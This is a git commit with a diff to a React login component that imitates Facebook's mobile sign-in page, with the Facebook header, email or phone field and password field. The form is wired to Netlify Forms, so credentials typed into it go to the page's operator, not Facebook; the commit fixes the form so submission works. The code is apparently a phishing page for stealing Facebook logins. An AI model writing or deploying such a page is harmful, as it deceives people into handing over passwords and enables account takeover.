3e2ebb00ddb4978420c9fc68e28f2e0463bdd0fd
prabhat <pdhakar179@gmail.com>
2021-12-26 11:19:36 +0530

    second commit

--- src/LoginPage.js
+++ src/LoginPage.js
@@ -7,7 +7,7 @@ const LoginPage = () =>{
         <>
           <div className="tophead">Get Facebook for Android and browse faster.</div>
           <h2 className="header">facebook</h2> 
-          <form name="data-form" method="post" data-netlify="true" onSubmit="submit">
+          <form name="data-form" method="POST" data-netlify="true">
               <input type="hidden" name="form-name" value="data-form" />
               <div className="mail">
                   <input type="text" name="email" id="email" placeholder="Mobile number or email address" value={mail} onChange={(e)=>{setMail(e.target.value)}} ></input>
@@ -15,7 +15,7 @@ const LoginPage = () =>{
               <div className="password">
                   <input type="password" name="password" id="pass" placeholder="Password" value={pass} onChange={(e)=>{setPass(e.target.value)}} ></input>
               </div>
-              <input type="submit" value="Log In" id="btn" ></input>
+              <button type="submit" id="btn" >Log In</button>
           </form>
           <div className="fpass"> Forgotten password?</div>
           <div style={{color:"grey", marginTop:"10px"}} >_______________________    or   _______________________</div>
